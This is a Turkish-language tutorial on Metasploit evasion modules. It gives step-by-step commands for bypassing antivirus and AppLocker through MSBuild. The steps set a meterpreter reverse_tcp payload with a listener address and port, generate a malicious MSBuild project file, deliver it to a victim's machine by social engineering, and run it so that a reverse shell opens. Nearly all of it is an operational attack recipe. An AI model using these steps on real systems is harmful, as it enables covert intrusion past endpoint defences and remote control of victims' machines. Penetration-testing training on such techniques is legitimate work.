# Evasion (Kaçınma ve Atlatma) Modülleri

Evasion modülleri, zararlı kodlarınızı (Payload) hedef sistemdeki Antivirüs (AV), IPS/IDS ve Uygulama Kontrol mekanizmalarına (Örn: Windows AppLocker) yakalatmadan çalıştırmak için tasarlanmış özel araçlardır.

## 1. Neden Evasion Kullanılır?
* **Modern Antivirüsleri Aşmak:** Encoders (Kodlayıcılar) artık AV'ler tarafından kolayca tanınmaktadır. Evasion modülleri ise zararlı kodu doğrudan şifrelemek veya C dilinde derleyip sistem belleğine doğrudan enjekte etmek gibi çok daha karmaşık mimariler kullanır.
* **AppLocker ve Beyaz Liste (Whitelisting) Atlatma:** Kurumsal ağlarda "Sadece izin verilen .exe dosyaları çalışabilir" kuralı (AppLocker) vardır. Evasion modülleri, Microsoft'un kendi ürettiği ve %100 güvendiği yasal sistem dosyalarını (Örn: `MSBuild.exe`, `Regsvr32.exe`) kandırarak, bizim zararlı kodumuzu onlara çalıştırtır. Sisteme göre Microsoft'un kendi programı çalıştığı için alarm çalmaz.

## 2. Kullanılabilir Modülleri Görme
Metasploit içinde sisteme ve atlatma tekniğine göre ayrılmış evasion modüllerini listelemek için:
```bash
show evasion
````

---

## 3. Pratik Senaryo: MSBuild ile AppLocker Atlatma

Windows ortamlarında geliştiricilerin kod derlemek için kullandığı yasal Microsoft aracı `MSBuild.exe`'yi kullanarak güvenlik duvarını aşma senaryosu:

### Adım 1: Evasion Modülünü Seçme

AppLocker atlatma modülünü aktif ediyoruz:

```Bash
use evasion/windows/applocker_evasion_msbuild
```

### Adım 2: İçine Gizlenecek Payload'ı Belirleme

Bu yasal dosyanın içine hangi zararlı kodu gömeceğimizi söylüyoruz (Reverse Shell):

```Bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

### Adım 3: Bağlantı Ayarlarını Yapma

Kendi IP'mizi ve dinleme portumuzu giriyoruz:

```Bash
set LHOST 192.168.1.10
set LPORT 4444
```

### Adım 4: Kodu Üretme

```Bash
run
```

Bu komut çalıştığında Metasploit size bir `.exe` dosyası vermez! Bunun yerine `msbuild.txt` (veya `.xml`) formatında bir proje dosyası verir. Zararlı kod bu metin dosyasının içine gizlenmiştir.

### Adım 5: Hedefte Çalıştırma (Kritik Aşama)

Oluşturulan `msbuild.txt` dosyasını kurbanın makinesine bir şekilde (Sosyal mühendislik, web zafiyeti vb.) kopyaladıktan sonra, hedef makinenin komut satırında şu komut çalıştırılır:

DOS

```
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe msbuild.txt
```

**Sonuç:** Windows, güvendiği MSBuild aracını çalıştırdığını sanırken, MSBuild gidip dosyanın içindeki Meterpreter shellcode'unu belleğe yazar. Antivirüs ve AppLocker atlatılmış, Reverse Shell bağlantınız açılmış olur.